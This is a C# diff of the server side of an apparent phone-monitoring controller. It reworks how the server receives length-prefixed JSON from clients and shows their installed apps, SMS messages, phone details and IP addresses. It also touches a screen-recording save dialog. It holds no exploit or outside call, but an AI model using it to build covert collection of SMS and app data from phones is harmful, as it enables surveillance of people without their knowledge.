@@ -73,72 +73,76 @@ namespace ClientCtrl
         //接受客户端消息
         private void ReciveContent(Object obj)
         {
-
-            Socket socketServer = obj as Socket;
-
-            byte[] uuidByte = new byte[36];
-            socketServer.Receive(uuidByte);
-            //每个请求都有唯一标识
-            String uuid = System.Text.UTF8Encoding.Default.GetString(uuidByte);
-
-            byte[] headerByte = new byte[3];
-            socketServer.Receive(headerByte);
-            String header = System.Text.UTF8Encoding.Default.GetString(headerByte);
-            listBox_log.Items.Add("client:===header:" + header);
-
-            byte[] buffer = new byte[10 * 1024];
             int length = 0;
-            if ("str".Equals(header))
+            while (true)
             {
-                StringBuilder sb = new StringBuilder();
-                while ((length = socketServer.Receive(buffer)) > 0)
+                Console.WriteLine("ReciveContent:");
+
+                Socket socketServer = obj as Socket;
+                if (length == 0)
                 {
-                    sb.Append(UTF8Encoding.UTF8.GetChars(buffer,0,length));
+                    byte[] headerByte = new byte[15];
+                    socketServer.Receive(headerByte);
+                    String header = System.Text.UTF8Encoding.Default.GetString(headerByte);
+                    Console.WriteLine("client:===header:" + header);
+                    listBox_log.Items.Add("client:===header:" + header);
+                    try
+                    {
+                        length = int.Parse(header);
+
+                    }
+                    catch (Exception e)
+                    {
+
+                    }
+                    continue;
+                }
+                byte[] buffer = new byte[length];
+                int len = socketServer.Receive(buffer);
+
+                StringBuilder sb = new StringBuilder();
+                sb.Append(UTF8Encoding.UTF8.GetChars(buffer, 0, len));
+                int end = 0;
+
+                while ((end=length - len) > 0)
+                {
+                    length = end;
+                   // byte[] endBuffer = new byte[end];
+                    len = socketServer.Receive(buffer);
+                    sb.Append(UTF8Encoding.UTF8.GetChars(buffer, 0, len));
+                    Console.WriteLine("读取了多长的数据？：" + len);
+
 
                 }
-                Console.WriteLine("str==content====" + sb.ToString());
+                Console.WriteLine("body：" + sb.ToString());
+
+
+
+                if (sb.Length == 0)
+                {
+                    Console.WriteLine("body是空的啊");
+                    continue;
+                }
+                length = 0;
+
+                //添加数据
                 ClientInfoBean clientInfo = AllUtils.jsonToObj(sb.ToString(), typeof(ClientInfoBean)) as ClientInfoBean;
-                Console.WriteLine("111==========");
                 if (clientInfo == null)
                 {
-
                     Console.WriteLine("clientInfo==null==========");
                     return;
                 }
                 //upData
-                 addDataList(clientInfo, socketServer);
-                Console.WriteLine("2222==========");
+                addDataList(clientInfo, socketServer);
                 UIAppList.updataAppsData(this.dataGridView_apps, clientInfo.appList);
 
                 IPEndPoint clientipe = (IPEndPoint)socketServer.RemoteEndPoint;
                 clientInfo.ipAddress = clientipe.Address.ToString();
                 UIAppList.updataPhoneInfo(this.listBox_phone_info, clientInfo);
-                Console.WriteLine("3333==========");
                 UIAppList.updataSmsList(this.dataGridView_sms, clientInfo.smsList);
-                Console.WriteLine("app列表：" + clientInfo.appList);
-                return;
-            }
-            //接受的是图片
-            MemoryStream ms = new MemoryStream();
-
-            while ((length = socketServer.Receive(buffer)) > 0)
-            {
-                ms.Write(buffer, 0, buffer.Length);
-            }
-
-            //string words = Encoding.UTF8.GetString(buffer, 0, buffer.Length);
-            listBox_log.Items.Add("client:===img====");
-            Bitmap bmp = null;
-            try
-            {
-                bmp = new Bitmap(ms);
 
             }
-            catch (Exception e)
-            {
-            }
-            this.pictureBox1.Image = bmp;
-            ms.Close();
+
 
 
         }
@@ -187,16 +191,17 @@ namespace ClientCtrl
         private void button1_Click(object sender, EventArgs e)
         {
             SaveFileDialog saveFileDialog = new SaveFileDialog();
-            saveFileDialog.InitialDirectory="D:/";
+            saveFileDialog.InitialDirectory = "D:/";
             saveFileDialog.Filter = "avi视频文件(*.avi)|*.avi|mp4视频文件(*.mp4)|*.mp4";
             String time = DateTime.Now.ToString("yyyy_MM_dd");
-            saveFileDialog.FileName = "屏幕录制"+ time ;
+            saveFileDialog.FileName = "屏幕录制" + time;
             saveFileDialog.FilterIndex = 2;
             saveFileDialog.RestoreDirectory = true;
-            if (saveFileDialog.ShowDialog() == DialogResult.OK) {
-               String  localFilePath = saveFileDialog.FileName.ToString();
+            if (saveFileDialog.ShowDialog() == DialogResult.OK)
+            {
+                String localFilePath = saveFileDialog.FileName.ToString();
                 System.IO.FileStream fs = (System.IO.FileStream)saveFileDialog.OpenFile();//输出文件
-                
+
                 fs.Write(System.Text.Encoding.ASCII.GetBytes(localFilePath), 0, localFilePath.Length);
                 fs.Flush();
                 fs.Close();
